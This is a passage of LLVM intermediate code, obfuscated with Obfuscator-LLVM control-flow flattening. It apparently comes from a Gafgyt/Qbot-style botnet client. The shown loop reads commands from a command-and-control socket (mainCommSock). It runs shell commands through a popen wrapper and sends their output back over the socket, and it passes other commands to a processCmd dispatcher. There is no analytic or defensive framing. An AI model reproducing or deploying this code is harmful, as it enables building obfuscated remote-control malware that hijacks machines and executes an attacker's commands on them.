  %250 = bitcast i8* %249 to i32*
  store i32* %250, i32** %22, align 8
  store i32 0, i32* %23, align 4
  store i32 -918527744, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = load i32, i32* %23, align 4
  %253 = zext i32 %252 to i64
  %254 = load i64, i64* @numpids, align 8
  %255 = icmp ult i64 %253, %254
  %256 = select i1 %255, i32 -1933347591, i32 -13109776
  store i32 %256, i32* %switchVar
  br label %loopEnd

; <label>:257:                                    ; preds = %loopEntry
  %258 = load i32*, i32** @pids, align 8
  %259 = load i32, i32* %23, align 4
  %260 = zext i32 %259 to i64
  %261 = getelementptr inbounds i32, i32* %258, i64 %260
  %262 = load i32, i32* %261, align 4
  %263 = load i32*, i32** %22, align 8
  %264 = load i32, i32* %23, align 4
  %265 = zext i32 %264 to i64
  %266 = getelementptr inbounds i32, i32* %263, i64 %265
  store i32 %262, i32* %266, align 4
  store i32 -1262039723, i32* %switchVar
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i32, i32* %23, align 4
  %269 = add i32 %268, 1
  store i32 %269, i32* %23, align 4
  store i32 -918527744, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  %271 = load i32*, i32** @pids, align 8
  %272 = bitcast i32* %271 to i8*
  call void @free(i8* %272) #2
  %273 = load i32*, i32** %22, align 8
  store i32* %273, i32** @pids, align 8
  store i32 -1114407372, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 1727582732, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i32, i32* %21, align 4
  %277 = add nsw i32 %276, 1
  store i32 %277, i32* %21, align 4
  store i32 -590235769, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %20, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %280
  store i8 0, i8* %281, align 1
  %282 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %282)
  %283 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %284 = call i8* @strstr(i8* %283, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i32 0, i32 0)) #10
  %285 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %286 = icmp eq i8* %284, %285
  %287 = select i1 %286, i32 -1304585779, i32 1443603002
  store i32 %287, i32* %switchVar
  br label %loopEnd

; <label>:288:                                    ; preds = %loopEntry
  %289 = load i32, i32* @mainCommSock, align 4
  %290 = call i32 (i32, i8*, ...) @sockprintf(i32 %289, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.551, i32 0, i32 0))
  store i32 -1612085, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %293 = call i8* @strstr(i8* %292, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.552, i32 0, i32 0)) #10
  %294 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %295 = icmp eq i8* %293, %294
  %296 = select i1 %295, i32 -1477229293, i32 -59904667
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  %298 = load i32, i32* %10, align 4
  %299 = add nsw i32 %298, 1
  store i32 %299, i32* %10, align 4
  %300 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.553, i32 0, i32 0))
  %301 = load i32, i32* %10, align 4
  %302 = icmp sgt i32 %301, 20
  %303 = select i1 %302, i32 1014875889, i32 -2103849843
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  call void @exit(i32 0) #14
  unreachable

; <label>:305:                                    ; preds = %loopEntry
  store i32 685755957, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %307, i8** %24, align 8
  %308 = load i8*, i8** %24, align 8
  %309 = load i8, i8* %308, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 33
  %312 = select i1 %311, i32 1716031623, i32 1341377150
  store i32 %312, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i8*, i8** %24, align 8
  %315 = getelementptr inbounds i8, i8* %314, i64 1
  store i8* %315, i8** %25, align 8
  store i32 723768058, i32* %switchVar
  br label %loopEnd

; <label>:316:                                    ; preds = %loopEntry
  %317 = load i8*, i8** %25, align 8
  %318 = load i8, i8* %317, align 1
  %319 = zext i8 %318 to i32
  %320 = icmp ne i32 %319, 32
  %321 = select i1 %320, i32 -266470291, i32 636867547
  store i32 %321, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:322:                                    ; preds = %loopEntry
  %323 = load i8*, i8** %25, align 8
  %324 = load i8, i8* %323, align 1
  %325 = zext i8 %324 to i32
  %326 = icmp ne i32 %325, 0
  store i32 636867547, i32* %switchVar
  store i1 %326, i1* %.reg2mem2
  br label %loopEnd

; <label>:327:                                    ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %328 = select i1 %.reload3, i32 -424821792, i32 -2070814426
  store i32 %328, i32* %switchVar
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8*, i8** %25, align 8
  %331 = getelementptr inbounds i8, i8* %330, i32 1
  store i8* %331, i8** %25, align 8
  store i32 723768058, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  %333 = load i8*, i8** %25, align 8
  %334 = load i8, i8* %333, align 1
  %335 = zext i8 %334 to i32
  %336 = icmp eq i32 %335, 0
  %337 = select i1 %336, i32 175854301, i32 721575141
  store i32 %337, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  store i32 -1612085, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8*, i8** %25, align 8
  store i8 0, i8* %340, align 1
  %341 = load i8*, i8** %24, align 8
  %342 = getelementptr inbounds i8, i8* %341, i64 1
  store i8* %342, i8** %25, align 8
  %343 = load i8*, i8** %24, align 8
  %344 = load i8*, i8** %25, align 8
  %345 = call i64 @strlen(i8* %344) #10
  %346 = getelementptr inbounds i8, i8* %343, i64 %345
  %347 = getelementptr inbounds i8, i8* %346, i64 2
  store i8* %347, i8** %24, align 8
  store i32 -531975491, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i8*, i8** %24, align 8
  %350 = load i8*, i8** %24, align 8
  %351 = call i64 @strlen(i8* %350) #10
  %352 = sub i64 %351, 1
  %353 = getelementptr inbounds i8, i8* %349, i64 %352
  %354 = load i8, i8* %353, align 1
  %355 = zext i8 %354 to i32
  %356 = icmp eq i32 %355, 10
  %357 = select i1 %356, i32 1687076547, i32 -2021383633
  store i32 %357, i32* %switchVar
  store i1 true, i1* %.reg2mem4
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i8*, i8** %24, align 8
  %360 = load i8*, i8** %24, align 8
  %361 = call i64 @strlen(i8* %360) #10
  %362 = sub i64 %361, 1
  %363 = getelementptr inbounds i8, i8* %359, i64 %362
  %364 = load i8, i8* %363, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp eq i32 %365, 13
  store i32 1687076547, i32* %switchVar
  store i1 %366, i1* %.reg2mem4
  br label %loopEnd

; <label>:367:                                    ; preds = %loopEntry
  %.reload5 = load i1, i1* %.reg2mem4
  %368 = select i1 %.reload5, i32 -1559267271, i32 1775745969
  store i32 %368, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8*, i8** %24, align 8
  %371 = load i8*, i8** %24, align 8
  %372 = call i64 @strlen(i8* %371) #10
  %373 = sub i64 %372, 1
  %374 = getelementptr inbounds i8, i8* %370, i64 %373
  store i8 0, i8* %374, align 1
  store i32 -531975491, i32* %switchVar
  br label %loopEnd

; <label>:375:                                    ; preds = %loopEntry
  %376 = load i8*, i8** %24, align 8
  store i8* %376, i8** %26, align 8
  store i32 574314623, i32* %switchVar
  br label %loopEnd

; <label>:377:                                    ; preds = %loopEntry
  %378 = load i8*, i8** %24, align 8
  %379 = load i8, i8* %378, align 1
  %380 = zext i8 %379 to i32
  %381 = icmp ne i32 %380, 32
  %382 = select i1 %381, i32 1764637561, i32 -789181262
  store i32 %382, i32* %switchVar
  store i1 false, i1* %.reg2mem6
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = load i8*, i8** %24, align 8
  %385 = load i8, i8* %384, align 1
  %386 = zext i8 %385 to i32
  %387 = icmp ne i32 %386, 0
  store i32 -789181262, i32* %switchVar
  store i1 %387, i1* %.reg2mem6
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %.reload7 = load i1, i1* %.reg2mem6
  %389 = select i1 %.reload7, i32 -644839036, i32 1114097761
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i8*, i8** %24, align 8
  %392 = getelementptr inbounds i8, i8* %391, i32 1
  store i8* %392, i8** %24, align 8
  store i32 574314623, i32* %switchVar
  br label %loopEnd

; <label>:393:                                    ; preds = %loopEntry
  %394 = load i8*, i8** %24, align 8
  store i8 0, i8* %394, align 1
  %395 = load i8*, i8** %24, align 8
  %396 = getelementptr inbounds i8, i8* %395, i32 1
  store i8* %396, i8** %24, align 8
  %397 = load i8*, i8** %26, align 8
  store i8* %397, i8** %27, align 8
  store i32 2044390061, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8*, i8** %27, align 8
  %400 = load i8, i8* %399, align 1
  %401 = icmp ne i8 %400, 0
  %402 = select i1 %401, i32 1676448717, i32 236920226
  store i32 %402, i32* %switchVar
  br label %loopEnd

; <label>:403:                                    ; preds = %loopEntry
  %404 = load i8*, i8** %27, align 8
  %405 = load i8, i8* %404, align 1
  %406 = zext i8 %405 to i32
  %407 = call i32 @toupper(i32 %406) #10
  %408 = trunc i32 %407 to i8
  %409 = load i8*, i8** %27, align 8
  store i8 %408, i8* %409, align 1
  %410 = load i8*, i8** %27, align 8
  %411 = getelementptr inbounds i8, i8* %410, i32 1
  store i8* %411, i8** %27, align 8
  store i32 2044390061, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i8*, i8** %26, align 8
  %414 = call i32 @strcmp(i8* %413, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.554, i32 0, i32 0)) #10
  %415 = icmp eq i32 %414, 0
  %416 = select i1 %415, i32 -1984763118, i32 1489929746
  store i32 %416, i32* %switchVar
  br label %loopEnd

; <label>:417:                                    ; preds = %loopEntry
  %418 = call i32 @listFork()
  %419 = icmp ne i32 %418, 0
  %420 = select i1 %419, i32 1642030782, i32 608244034
  store i32 %420, i32* %switchVar
  br label %loopEnd

; <label>:421:                                    ; preds = %loopEntry
  store i32 -1612085, i32* %switchVar
  br label %loopEnd

; <label>:422:                                    ; preds = %loopEntry
  %423 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %423, i8 0, i64 1024, i32 16, i1 false)
  %424 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %425 = load i8*, i8** %24, align 8
  %426 = call i32 (i8*, i8*, ...) @szprintf(i8* %424, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.555, i32 0, i32 0), i8* %425)
  %427 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %428 = call i32 @fdpopen(i8* %427, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.544, i32 0, i32 0))
  store i32 %428, i32* %29, align 4
  store i32 -1371086162, i32* %switchVar
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %431 = load i32, i32* %29, align 4
  %432 = call i8* @fdgets(i8* %430, i32 1024, i32 %431)
  %433 = icmp ne i8* %432, null
  %434 = select i1 %433, i32 100350340, i32 450806807
  store i32 %434, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %436)
  %437 = load i32, i32* @mainCommSock, align 4
  %438 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %439 = call i32 (i32, i8*, ...) @sockprintf(i32 %437, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.556, i32 0, i32 0), i8* %438)
  %440 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %440, i8 0, i64 1024, i32 16, i1 false)
  %441 = call i32 @sleep(i32 1)
  store i32 -1371086162, i32* %switchVar
  br label %loopEnd

; <label>:442:                                    ; preds = %loopEntry
  %443 = load i32, i32* %29, align 4
  %444 = call i32 @fdpclose(i32 %443)
  call void @exit(i32 0) #14
  unreachable

; <label>:445:                                    ; preds = %loopEntry
  store i32 1, i32* %31, align 4
  %446 = load i8*, i8** %24, align 8
  %447 = call i8* @strtok(i8* %446, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i32 0, i32 0)) #2
  store i8* %447, i8** %32, align 8
  %448 = load i8*, i8** %26, align 8
  %449 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %448, i8** %449, align 16
  store i32 -1199951636, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  %451 = load i8*, i8** %32, align 8
  %452 = icmp ne i8* %451, null
  %453 = select i1 %452, i32 1040039334, i32 -753406958
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i8*, i8** %32, align 8
  %456 = load i8, i8* %455, align 1
  %457 = zext i8 %456 to i32
  %458 = icmp ne i32 %457, 10
  %459 = select i1 %458, i32 -55813385, i32 -97818647
  store i32 %459, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = load i8*, i8** %32, align 8
  %462 = call i64 @strlen(i8* %461) #10
  %463 = add i64 %462, 1
  %464 = call noalias i8* @malloc(i64 %463) #2
  %465 = load i32, i32* %31, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %466
  store i8* %464, i8** %467, align 8
  %468 = load i32, i32* %31, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %469
  %471 = load i8*, i8** %470, align 8
  %472 = load i8*, i8** %32, align 8
  %473 = call i64 @strlen(i8* %472) #10
  %474 = add i64 %473, 1
  call void @llvm.memset.p0i8.i64(i8* %471, i8 0, i64 %474, i32 1, i1 false)
  %475 = load i32, i32* %31, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %476
  %478 = load i8*, i8** %477, align 8
  %479 = load i8*, i8** %32, align 8
  %480 = call i8* @strcpy(i8* %478, i8* %479) #2
  %481 = load i32, i32* %31, align 4
  %482 = add nsw i32 %481, 1
  store i32 %482, i32* %31, align 4
  store i32 -97818647, i32* %switchVar
  br label %loopEnd

; <label>:483:                                    ; preds = %loopEntry
  %484 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.557, i32 0, i32 0)) #2
  store i8* %484, i8** %32, align 8
  store i32 -1199951636, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %31, align 4
  %487 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %486, i8** %487)
  %488 = load i32, i32* %31, align 4
  %489 = icmp sgt i32 %488, 1
  %490 = select i1 %489, i32 -248966815, i32 -842979195
  store i32 %490, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  store i32 1430062831, i32* %switchVar
  br label %loopEnd

; <label>:492:                                    ; preds = %loopEntry
  %493 = load i32, i32* %33, align 4
  %494 = load i32, i32* %31, align 4
  %495 = icmp slt i32 %493, %494
  %496 = select i1 %495, i32 -577648622, i32 -967408304
  store i32 %496, i32* %switchVar
  br label %loopEnd

; <label>:497:                                    ; preds = %loopEntry
  %498 = load i32, i32* %33, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %499
  %501 = load i8*, i8** %500, align 8
  call void @free(i8* %501) #2
  store i32 -705358599, i32* %switchVar
  br label %loopEnd

; <label>:502:                                    ; preds = %loopEntry
  %503 = load i32, i32* %33, align 4
  %504 = add nsw i32 %503, 1
  store i32 %504, i32* %33, align 4
  store i32 1430062831, i32* %switchVar
  br label %loopEnd

; <label>:505:                                    ; preds = %loopEntry
  store i32 -842979195, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1341377150, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -1612085, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 -1084556205, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i32, i32* %3, align 4
  ret i32 %510

loopEnd:                                          ; preds = %508, %507, %506, %505, %502, %497, %492, %491, %485, %483, %460, %454, %450, %445, %435, %429, %422, %421, %417, %412, %403, %398, %393, %390, %388, %383, %377, %375, %369, %367, %358, %348, %339, %338, %332, %329, %327, %322, %316, %313, %306, %305, %297, %291, %288, %278, %275, %274, %270, %267, %257, %251, %238, %235, %224, %218, %215, %206, %200, %199, %193, %187, %185, %181, %177, %176, %174, %173, %172, %170, %169, %165, %160, %156, %148, %147, %144, %143, %140, %139, %133, %125, %121, %120, %117, %108, %102, %92, %89, %78, %77, %65, %61, %58, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146579359}
!2 = !{i32 -2146578668}
!3 = !{i32 -2146577974}
!4 = !{i32 -2146577214}
!5 = !{i32 -2146576391}
!6 = !{i32 -2146575484}
